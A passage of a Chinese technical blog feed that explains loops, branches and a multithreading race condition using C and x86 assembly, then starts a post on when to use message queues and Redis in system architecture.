<p>inc 下一行的 cmp 是用来对第一个操作数和第二个操作数的数值进行比较的指令。<code>cmp ebx,10</code>就相当于 C 语言中的<code>i &lt; 10</code>这一处理，意思是把 ebx 寄存器的值与 10 进行比较。汇编语言中比较指令的结果，会存储在 CPU 的标志寄存器中。不过，标志寄存器的值，程序是无法直接参考的。那如何判断比较结果呢？<br>汇编语言中有多个跳转指令，这些跳转指令会根据标志寄存器的值来判断是否进行跳转操作，例如最后一行的 jl，它会根据<code>cmp ebx,10</code>指令所存储在标志寄存器中的值来判断是否跳转，jl 这条指令表示的就是 jump on less than（小于的话就跳转）。发现如果 i 比 10 小，就会跳转到 @4 所在的指令处继续执行。</p>
<p>那么汇编代码的意思也可以用 C 语言来改写一下，加深理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        i ^= i;</span><br><span class="line">L4: MySub();</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; <span class="number">10</span>) <span class="keyword">goto</span> L4;</span><br></pre></td></tr></table></figure>

<p>代码第一行<code>i ^= i</code>指的就是 i 和 i 进行异或运算，也就是 XOR 运算，<code>MySub()</code>函数用 L4 标签来替代，然后进行 i 自增操作，如果 i 的值小于 10 的话，就会一直循环<code>MySub()</code>函数。</p>
<h2 id="条件分支的处理方法"><a href="#条件分支的处理方法" class="headerlink" title="条件分支的处理方法"></a>条件分支的处理方法</h2><p>条件分支的处理方式和循环的处理方式很相似，使用的也是 cmp 指令和跳转指令。下面是用 C 语言编写的条件分支的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义 MySub1 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySub1</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 不做任何处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MySub2 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySub2</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 不做任何处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MySub3 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySub3</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 不做任何处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MyFunc 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line">  <span class="comment">// 根据条件调用不同的函数</span></span><br><span class="line">  <span class="keyword">if</span>(a &gt; <span class="number">100</span>)&#123;</span><br><span class="line">    MySub1();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(a &lt; <span class="number">50</span>)&#123;</span><br><span class="line">    MySub2();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    MySub3();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单的一个实现了条件判断的 C 语言代码，那么我们把它用 Borland C++ 编译之后的结果如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_MyFunc proc <span class="built_in">near</span></span><br><span class="line"> <span class="keyword">push</span>      <span class="built_in">ebp</span>              </span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="number">123</span>          <span class="comment">; 把 123 存入 eax 寄存器中</span></span><br><span class="line"> <span class="keyword">cmp</span>       <span class="built_in">eax</span>,<span class="number">100</span>          <span class="comment">; 把 eax 寄存器的值同 100 进行比较</span></span><br><span class="line"> <span class="keyword">jle</span>       short @<span class="number">8</span>         <span class="comment">; 比 100 小时，跳转到 @8 标签</span></span><br><span class="line"> <span class="keyword">call</span>      _MySub1          <span class="comment">; 调用 MySub1 函数</span></span><br><span class="line"> <span class="keyword">jmp</span>             short @<span class="number">11</span>      <span class="comment">; 跳转到 @11 标签</span></span><br><span class="line">@<span class="number">8</span>:</span><br><span class="line"> <span class="keyword">cmp</span>       <span class="built_in">eax</span>,<span class="number">50</span>               <span class="comment">; 把 eax 寄存器的值同 50 进行比较</span></span><br><span class="line"> <span class="keyword">jge</span>       short @<span class="number">10</span>        <span class="comment">; 比 50 大时，跳转到 @10 标签</span></span><br><span class="line"> <span class="keyword">call</span>      _MySub2          <span class="comment">; 调用 MySub2 函数</span></span><br><span class="line"> <span class="keyword">jmp</span>             short @<span class="number">11</span>      <span class="comment">; 跳转到 @11 标签</span></span><br><span class="line">@<span class="number">10</span>:</span><br><span class="line"> <span class="keyword">call</span>      _MySub3          <span class="comment">; 调用 MySub3 函数</span></span><br><span class="line">@<span class="number">11</span>:</span><br><span class="line"> <span class="keyword">pop</span>       <span class="built_in">ebp</span></span><br><span class="line"> <span class="keyword">ret</span> </span><br><span class="line">_MyFunc endp</span><br></pre></td></tr></table></figure>

<p>上面代码用到了三种跳转指令，分别是 jle（jump on less or equal）比较结果小时跳转，jge（jump on greater or equal）比较结果大时跳转，还有不管结果怎样都会进行跳转的 jmp，在这些跳转指令之前还有用来比较的指令 cmp，构成了上述汇编代码的主要逻辑形式。</p>
<h2 id="了解程序运行逻辑的必要性"><a href="#了解程序运行逻辑的必要性" class="headerlink" title="了解程序运行逻辑的必要性"></a>了解程序运行逻辑的必要性</h2><p>通过对上述汇编代码和 C 语言源代码进行比较，想必大家对程序的运行方式有了新的理解，而且，从汇编源代码中获取的知识，也有助于了解 Java 等高级语言的特性，比如 Java 中就有 native 关键字修饰的变量，那么这个变量的底层就是使用 C 语言编写的，还有一些 Java 中的语法糖只有通过汇编代码才能知道其运行逻辑。在某些情况下，对于查找 bug 的原因也是有帮助的。</p>
<p>上面我们了解到的编程方式都是串行处理的，那么串行处理有什么特点呢？</p>
<figure class="image-box">
                <img src="48.png" alt title class>
                <p></p>
            </figure>

<p><strong>串行处理</strong>最大的一个特点就是<strong>专心只做一件事情</strong>，一件事情做完之后才会去做另外一件事情。</p>
<p>计算机是支持多线程的，多线程的核心就是 CPU 切换，如下图所示：</p>
<figure class="image-box">
                <img src="49.png" alt title class>
                <p></p>
            </figure>

<p>我们还是举个实际的例子，让我们来看一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义全局变量</span></span><br><span class="line"><span class="keyword">int</span> counter = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MyFunc1()</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">  counter *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MyFunc2()</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFunc2</span><span class="params">()</span></span>&#123;</span><br><span class="line">  counter *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码是更新 counter 的值的 C 语言程序，<code>MyFunc1()</code>和<code>MyFunc2()</code>的处理内容都是把 counter 的值扩大至原来的二倍，然后再把 counter 的值赋值给 counter 。这里，我们假设使用多线程处理，同时调用了一次 MyFunc1 和 MyFunc2 函数，这时，全局变量 counter 的值，理应编程 100 * 2 * 2 = 400。如果你开启了多个线程的话，你会发现 counter 的数值有时也是 200，对于为什么出现这种情况，如果你不了解程序的运行方式，是很难找到原因的。</p>
<p>我们将上面的代码转换成汇编语言的代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span>[_counter]     <span class="comment">; 将 counter 的值读入 eax 寄存器</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                     <span class="comment">; 将 eax 寄存器的值扩大 2 倍。</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span>[_counter],<span class="built_in">eax</span>     <span class="comment">; 将 eax 寄存器的值存入 counter 中。</span></span><br></pre></td></tr></table></figure>

<p>在多线程程序中，用汇编语言表示的代码每运行一行，处理都有可能切换到其他线程中。因而，假设 MyFun1 函数在读出 counter 数值 100 后，还未来得及将它的二倍值 200 写入 counter 时，正巧 MyFun2 函数读出了 counter 的值 100，那么结果就将变为 200。</p>
<figure class="image-box">
                <img src="50.png" alt title class>
                <p></p>
            </figure>

<p>为了避免该 bug，我们可以采用以函数或 C 语言代码的行为单位来禁止线程切换的<strong>锁定</strong>方法，或者使用某种线程安全的方式来避免该问题的出现。</p>
<p>现在基本上没有人用汇编语言来编写程序了，因为 C、Java 等高级语言的效率要比汇编语言快很多。不过，汇编语言的经验还是很重要的，通过借助汇编语言，我们可以更好的了解计算机运行机制。</p>
<hr>
<h1 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h1><ul>
<li><a href="https://www.computerhope.com/jargon/m/memory.htm" target="_blank" rel="noopener">https://www.computerhope.com/jargon/m/memory.htm</a></li>
<li><a href="https://baike.baidu.com/item/队列/14580481?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/队列/14580481?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/栈/12808149?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/栈/12808149?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/环形缓冲器/22701730?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/环形缓冲器/22701730?fr=aladdin</a></li>
<li>《程序是怎样跑起来的》</li>
<li><a href="https://baike.baidu.com/item/汇编语言/61826?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/汇编语言/61826?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/Windows操作系统/852149?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/Windows操作系统/852149?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/磁盘缓存" target="_blank" rel="noopener">https://baike.baidu.com/item/磁盘缓存</a></li>
<li><a href="https://baike.baidu.com/item/虚拟内存" target="_blank" rel="noopener">https://baike.baidu.com/item/虚拟内存</a></li>
<li><a href="https://baike.baidu.com/item/压缩算法/2762648" target="_blank" rel="noopener">https://baike.baidu.com/item/压缩算法/2762648</a></li>
<li><a href="https://en.wikipedia.org/wiki/Central_processing_unit" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Central_processing_unit</a></li>
<li><a href="https://www.digitaltrends.com/computing/what-is-a-cpu/" target="_blank" rel="noopener">https://www.digitaltrends.com/computing/what-is-a-cpu/</a></li>
<li><a href="https://baike.baidu.com/item/寄存器/187682?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/寄存器/187682?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/内存/103614?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/内存/103614?fr=aladdin</a></li>
<li><a href="https://blog.csdn.net/mark_lq/article/details/44245423" target="_blank" rel="noopener">https://blog.csdn.net/mark_lq/article/details/44245423</a></li>
<li><a href="https://baike.baidu.com/item/程序计数器/3219536?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/程序计数器/3219536?fr=aladdin</a></li>
<li><a href="https://zhidao.baidu.com/question/124425422.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/124425422.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 计算机原理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[什么时候该使用 MQ、Redis 和 配置中心]]></title>
      <url>/2020/01/20/WhenToUseMqRedisConfCenter/</url>
      <content type="html"><![CDATA[<blockquote>
<p>究竟什么时候该使用 MQ？ <a href="https://mp.weixin.qq.com/s/_kXoRBAotb4GXoDTqTObYQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_kXoRBAotb4GXoDTqTObYQ</a><br>架构选型，究竟啥时候选 Redis？ <a href="https://mp.weixin.qq.com/s/aX60hdFeuOTW8i3KG_CrtA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/aX60hdFeuOTW8i3KG_CrtA</a><br>互联网架构，究竟为什么需要配置中心？ <a href="https://mp.weixin.qq.com/s/k1IVjya7qtIf8jwWqTumjA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k1IVjya7qtIf8jwWqTumjA</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="究竟什么时候该使用-MQ？"><a href="#究竟什么时候该使用-MQ？" class="headerlink" title="究竟什么时候该使用 MQ？"></a>究竟什么时候该使用 MQ？</h1><p>&emsp;&emsp;<strong>任何脱离业务的组件引入都是耍流氓。</strong>引入一个组件，最先该解答的问题是，此组件解决什么问题。<br>&emsp;&emsp;<strong>MQ，互联网技术体系中一个常见组件</strong>，究竟什么时候不使用 MQ，究竟什么时候使用 MQ，MQ 究竟适合什么场景，是今天要分享的内容。</p>
<h2 id="MQ-是什么？"><a href="#MQ-是什么？" class="headerlink" title="MQ 是什么？"></a>MQ 是什么？</h2><p>&emsp;&emsp;消息总线（Message Queue），后文称 MQ，是一种<strong>跨进程的通信机制</strong>，用于上下游传递消息。</p>
<blockquote>
<p>&emsp;&emsp;画外音：这两个进程，一般不在同一台服务器上。</p>
</blockquote>
<figure class="image-box">
                <img src="1.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在互联网架构中，MQ 经常用做“上下游解耦”：<br>&emsp;（1）消息发送方只依赖 MQ，不关注消费方是谁；<br>&emsp;（2）消息消费方也只依赖 MQ，不关注发送方是谁。</p>
<blockquote>
<p>&emsp;&emsp;画外音：发送方与消费方，逻辑上和物理上都不依赖彼此。</p>
</blockquote>
<h2 id="什么时候不使用-MQ？"><a href="#什么时候不使用-MQ？" class="headerlink" title="什么时候不使用 MQ？"></a>什么时候不使用 MQ？</h2><p>&emsp;&emsp;<strong>当调用方需要关心消息执行结果时</strong>，通常不使用 MQ，而使用 RPC 调用。</p>
<figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ret = PassportService::userAuth(name, pass);</span><br><span class="line"><span class="keyword">switch</span>(ret)&#123;</span><br><span class="line">    <span class="keyword">case</span>(YES) : <span class="keyword">return</span> YesHTML();</span><br><span class="line">    <span class="keyword">case</span>(NO) : <span class="keyword">return</span> NoHTML();</span><br><span class="line">    <span class="keyword">case</span>(JUMP) : <span class="keyword">return</span> <span class="number">304</span>HTML():</span><br><span class="line">    <span class="keyword">default</span> : <span class="keyword">return</span> <span class="number">500</span>HTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如上例所示，上游调用 Passport 服务，处理结果不同，业务会走不同的逻辑处理分支（登录成功，登录失败，执行错误等），即“处理结果强依赖”，此时应该使用 RPC 调用。</p>
<blockquote>
<p>&emsp;&emsp;画外音：绝大部分情况，应该使用 RPC。</p>
</blockquote>
<h3 id="此时如果强行使用-MQ-呢？"><a href="#此时如果强行使用-MQ-呢？" class="headerlink" title="此时如果强行使用 MQ 呢？"></a>此时如果强行使用 MQ 呢？</h3><figure class="image-box">
                <img src="3.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如果强行使用 MQ 通讯，调用方不能直接告之用户登录成功又或失败，则要等待另一个 MQ 通知回调。这么玩，不但使得编码复杂，还会引入消息丢失的风险，中间多加入一层，多此一举。</p>
<h2 id="究竟什么时候使用-MQ-呢？"><a href="#究竟什么时候使用-MQ-呢？" class="headerlink" title="究竟什么时候使用 MQ 呢？"></a>究竟什么时候使用 MQ 呢？</h2><p>&emsp;&emsp;下面四类典型场景，应该使用 MQ。</p>
<h3 id="典型场景一：数据驱动的任务依赖"><a href="#典型场景一：数据驱动的任务依赖" class="headerlink" title="典型场景一：数据驱动的任务依赖"></a>典型场景一：数据驱动的任务依赖</h3><h4 id="什么是任务依赖？"><a href="#什么是任务依赖？" class="headerlink" title="什么是任务依赖？"></a>什么是任务依赖？</h4><p>&emsp;&emsp;举个栗子，互联网公司经常在凌晨进行一些数据统计任务，这些任务之间有一定的依赖关系，例如：<br>&emsp;（1）task3 需要使用 task2 的输出作为输入；<br>&emsp;（2）task2 需要使用 task1 的输出作为输入。<br>&emsp;&emsp;这样的话，tast1, task2, task3之间就有任务依赖关系，必须 task1 先执行，再 task2 执行，再 task3 执行。</p>
<h4 id="对于这类需求，通常怎么实现呢？"><a href="#对于这类需求，通常怎么实现呢？" class="headerlink" title="对于这类需求，通常怎么实现呢？"></a>对于这类需求，通常怎么实现呢？</h4><p>&emsp;&emsp;常见的玩法是，<strong>crontab 人工排执行时间表</strong>。</p>
<figure class="image-box">
                <img src="4.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如上图，手动设定如下：<br>&emsp;（1）task1，0:00 执行，经验执行时间为 50 分钟；<br>&emsp;（2）task2，1:00 执行（为 task1 预留 10 分钟 buffer），经验执行时间也是 50 分钟；<br>&emsp;（3）task3，2:00 执行（为 task2 预留 10 分钟 buffer）。</p>
<h4 id="crontab-手动排表有什么坏处呢？"><a href="#crontab-手动排表有什么坏处呢？" class="headerlink" title="crontab 手动排表有什么坏处呢？"></a>crontab 手动排表有什么坏处呢？</h4><p>&emsp;（1）<strong>如果有一个任务执行时间超过了预留 buffer 的时间，将会得到错误的结果</strong>，因为后置任务不清楚前置任务是否执行成功，此时要手动重跑任务，还有可能要调整排班表；<br>&emsp;（2）<strong>总任务的执行时间很长</strong>，总是要预留很多 buffer，如果前置任务提前完成，后置任务不会提前开始；<br>&emsp;（3）如果一个任务被多个任务依赖，这个任务将会称为关键路径，<strong>排班表很难体现依赖关系，容易出错</strong>；<br>&emsp;（4）<strong>如果有一个任务的执行时间要调整，将会有多个任务的执行时间要调整</strong>。</p>
<p>&emsp;&emsp;无论如何，采用 “crontab 排班表” 的方法，各任务严重耦合，谁用过谁痛谁知道。</p>
<h4 id="应该如何优化呢？"><a href="#应该如何优化呢？" class="headerlink" title="应该如何优化呢？"></a>应该如何优化呢？</h4><p>&emsp;&emsp;<strong>采用 MQ 解耦。</strong></p>
<figure class="image-box">
                <img src="5.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如上图，任务之间通过 MQ 来传递“开始”与“结束”的通知：<br>&emsp;（1）task1 准时开始，结束后发一个 “task1 done” 的消息；<br>&emsp;（2）task2 订阅 “task1 done” 的消息，收到消息后第一时间启动执行，结束后发一个 “task2 done” 的消息；<br>&emsp;（3）task3 同理。</p>
<h4 id="采用-MQ-有什么好处呢？"><a href="#采用-MQ-有什么好处呢？" class="headerlink" title="采用 MQ 有什么好处呢？"></a>采用 MQ 有什么好处呢？</h4><p>&emsp;（1）<strong>不需要预留 buffer</strong>，上游任务执行完，下游任务总会在第一时间被执行；<br>&emsp;（2）依赖多个任务，被多个任务依赖都很好处理，只需要订阅相关消息即可；<br>&emsp;（3）<strong>有任务执行时间变化，下游任务都不需要调整执行时间</strong>。</p>
<p>&emsp;&emsp;需要特别说明的是，MQ 只用来传递上游任务执行完成的消息，<strong>并不用于传递真正的输入输出数据</strong>。</p>
<h3 id="典型场景二：上游不关心执行结果"><a href="#典型场景二：上游不关心执行结果" class="headerlink" title="典型场景二：上游不关心执行结果"></a>典型场景二：上游不关心执行结果</h3><p>&emsp;&emsp;上游需要关注执行结果时要用 “RPC 调用”，上游不关注执行结果时，使用 MQ。</p>
<p>&emsp;&emsp;举个栗子，58 同城的很多下游需要关注“用户发布帖子”这个事件，比如：<br>&emsp;（1）招聘用户发布帖子后，招聘业务要奖励 58 豆；<br>&emsp;（2）房产用户发布帖子后，房产业务要送 2 个置顶；<br>&emsp;（3）二手用户发布帖子后，二手业务要修改用户统计数据。</p>
<h4 id="对于这类需求，可以采用什么方式实现呢？"><a href="#对于这类需求，可以采用什么方式实现呢？" class="headerlink" title="对于这类需求，可以采用什么方式实现呢？"></a>对于这类需求，可以采用什么方式实现呢？</h4><figure class="image-box">
                <img src="6.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;比较无脑的，可以使用 RPC 调用来实现：<br>&emsp;&emsp;帖子发布服务执行完成之后，调用下游招聘业务、房产业务、二手业务，来完成消息的通知。</p>
<p>&emsp;&emsp;但事实上，这个通知是否正常正确的执行，帖子发布服务根本不关注。</p>
<h4 id="通过-RPC-来传递不需要知道处理结果的通知，有什么坏处呢？"><a href="#通过-RPC-来传递不需要知道处理结果的通知，有什么坏处呢？" class="headerlink" title="通过 RPC 来传递不需要知道处理结果的通知，有什么坏处呢？"></a>通过 RPC 来传递不需要知道处理结果的通知，有什么坏处呢？</h4><p>&emsp;（1）帖子发布流程的执行时间增加了；<br>&emsp;（2）下游服务当机，可能导致帖子发布服务受影响，上下游逻辑+物理依赖严重；<br>&emsp;（3）每当增加一个需要知道“帖子发布成功”信息的下游，修改代码的是帖子发布服务。</p>
<blockquote>
<p>&emsp;&emsp;画外音：这一点是最恶心的，属于架构设计中典型的反向依赖。</p>
</blockquote>
<h4 id="如何来进行优化呢？"><a href="#如何来进行优化呢？" class="headerlink" title="如何来进行优化呢？"></a>如何来进行优化呢？</h4><p>&emsp;&emsp;采用 MQ 解耦，代替 RPC。</p>
<figure class="image-box">
                <img src="7.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如上图所示：<br>&emsp;（1）帖子发布成功后，向 MQ 发一个消息；<br>&emsp;（2）哪个下游关注“帖子发布成功”的消息，主动去 MQ 订阅。</p>
<h4 id="如此一来，有什么好处呢？"><a href="#如此一来，有什么好处呢？" class="headerlink" title="如此一来，有什么好处呢？"></a>如此一来，有什么好处呢？</h4><p>&emsp;（1）上游执行时间短；<br>&emsp;（2）上下游逻辑+物理解耦，除了与 MQ 有物理连接，模块之间都不相互依赖；<br>&emsp;（3）新增一个下游消息关注方，上游不需要修改任何代码。</p>
<h3 id="典型场景三：上游关注执行结果，但执行时间很长"><a href="#典型场景三：上游关注执行结果，但执行时间很长" class="headerlink" title="典型场景三：上游关注执行结果，但执行时间很长"></a>典型场景三：上游关注执行结果，但执行时间很长</h3><p>&emsp;&emsp;有时候上游需要关注执行结果，但执行结果时间很长（典型的是调用离线处理，或者跨公网调用），也经常使用 <strong>回调网关 + MQ</strong> 来解耦。</p>
<p>&emsp;&emsp;举个栗子，微信支付，跨公网调用微信的接口，执行时间会比较长，但调用方又非常关注执行结果，此时一般怎么玩呢？</p>
<figure class="image-box">
                <img src="8.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;一般采用 “回调网关 + MQ” 方案来解耦：<br>&emsp;（1）调用方直接跨公网调用微信接口；<br>&emsp;（2）微信返回调用成功，此时并不代表返回成功；<br>&emsp;（3）微信执行完成后，回调统一网关；<br>&emsp;（4）网关将返回结果通知 MQ；<br>&emsp;（5）请求方收到结果通知。</p>
<p>&emsp;&emsp;这里需要注意的是，<strong>不应该由回调网关来 RPC 通知上游来通知结果</strong>，如果是这样的话，每次新增调用方，回调网关都需要修改代码，仍然会反向依赖，使用 回调网关 + MQ 的方案，新增任何对微信支付的调用，都不需要修改代码。</p>
<h2 id="结尾总结"><a href="#结尾总结" class="headerlink" title="结尾总结"></a>结尾总结</h2><p>&emsp;&emsp;MQ 是一个互联网架构中常见的解耦利器。</p>
<h3 id="什么时候不使用-MQ？-1"><a href="#什么时候不使用-MQ？-1" class="headerlink" title="什么时候不使用 MQ？"></a>什么时候不使用 MQ？</h3><p>&emsp;&emsp;上游实时关注执行结果，通常采用 RPC。</p>
<h3 id="什么时候使用-MQ？"><a href="#什么时候使用-MQ？" class="headerlink" title="什么时候使用 MQ？"></a>什么时候使用 MQ？</h3><p>&emsp;（1）数据驱动的任务依赖；<br>&emsp;（2）上游不关心多下游执行结果；<br>&emsp;（3）异步返回执行时间长。</p>
<hr>
<h1 id="架构选型，究竟啥时候选-Redis？"><a href="#架构选型，究竟啥时候选-Redis？" class="headerlink" title="架构选型，究竟啥时候选 Redis？"></a>架构选型，究竟啥时候选 Redis？</h1><p>&emsp;&emsp;Redis 是互联网分层架构中，最常用的 KV 缓存，但不少同学仍然不知道，为啥要选择 Redis。</p>
<blockquote>
<p>&emsp;&emsp;画外音：与之对比最多的，是 memcache。</p>
</blockquote>
<h2 id="一、复杂数据结构，选择-Redis-更合适"><a href="#一、复杂数据结构，选择-Redis-更合适" class="headerlink" title="一、复杂数据结构，选择 Redis 更合适"></a>一、复杂数据结构，选择 Redis 更合适</h2><p>&emsp;&emsp;value 是哈希，列表，集合，有序集合这类复杂的数据结构时，会选择 Redis，因为 mc 无法满足这些需求。</p>
<p>&emsp;&emsp;最典型的场景，用户订单列表，用户消息，帖子评论列表等。</p>
<h2 id="二、持久化，选择-Redis-更合适"><a href="#二、持久化，选择-Redis-更合适" class="headerlink" title="二、持久化，选择 Redis 更合适"></a>二、持久化，选择 Redis 更合适</h2><p>&emsp;&emsp;mc 无法满足持久化的需求，只得选择 Redis。<br>&emsp;&emsp;但是，这里要提醒的是，真的使用对了 Redis 的持久化功能么？</p>
<p>&emsp;&emsp;<strong>千万不要把 Redis 当作数据库用</strong>：<br>&emsp;（1）Redis 的定期快照不能保证数据不丢失；<br>&emsp;（2）Redis 的 AOF 会降低效率，并且不能支持太大的数据量。</p>
<p>&emsp;&emsp;不要期望 Redis 做固化存储会比 MySQL 做得好，不同的工具做各自擅长的事情，把 Redis 当作数据库用，这样的设计八成是错误的。</p>
<h3 id="缓存场景，开启固化功能，有什么利弊？"><a href="#缓存场景，开启固化功能，有什么利弊？" class="headerlink" title="缓存场景，开启固化功能，有什么利弊？"></a>缓存场景，开启固化功能，有什么利弊？</h3><p>&emsp;&emsp;如果只是缓存场景，数据存放在数据库，缓存在 Redis，此时如果开启固化功能：<br>&emsp;&emsp;<strong>优点</strong>是，Redis 挂了再重启，内存里能够快速恢复热数据，不会瞬时将压力压到数据库上，没有一个 cache 预热的过程。<br>&emsp;&emsp;<strong>缺点</strong>是，在 Redis 挂了的过程中，如果数据库中有数据的修改，可能导致 Redis 重启后，数据库与 Redis 的数据不一致。</p>
<p>&emsp;&emsp;因此，只读场景，或者允许一些不一致的业务场景，可以尝试开启 Redis 的固化功能。</p>
<h2 id="三、高可用，选择-Redis-更合适"><a href="#三、高可用，选择-Redis-更合适" class="headerlink" title="三、高可用，选择 Redis 更合适"></a>三、高可用，选择 Redis 更合适</h2><p>&emsp;&emsp;Redis 天然支持集群功能，可以实现主动复制，读写分离。<br>&emsp;&emsp;Redis 官方也提供了 sentinel 集群管理工具，能够实现主从服务监控，故障自动转移，这一切，对于客户端都是透明的，无需程序改动，也无需人工介入。</p>
<blockquote>
<p>&emsp;&emsp;画外音：memcache，要想要实现高可用，需要进行二次开发，例如客户端的双读双写，或者服务端的集群同步。</p>
</blockquote>
<p>&emsp;&emsp;但是，这里要提醒的是，大部分业务场景，缓存真的需要高可用么？<br>&emsp;（1）缓存场景，很多时候，是允许 cache miss；<br>&emsp;（2）缓存挂了，很多时候可以通过 DB 读取数据。</p>
<p>&emsp;&emsp;所以，需要认真剖析业务场景，高可用，是否真的是对缓存的主要需求？</p>
<blockquote>
<p>&emsp;&emsp;画外音：即时通讯业务中，用户的在线状态，就有高可用需求。</p>
</blockquote>
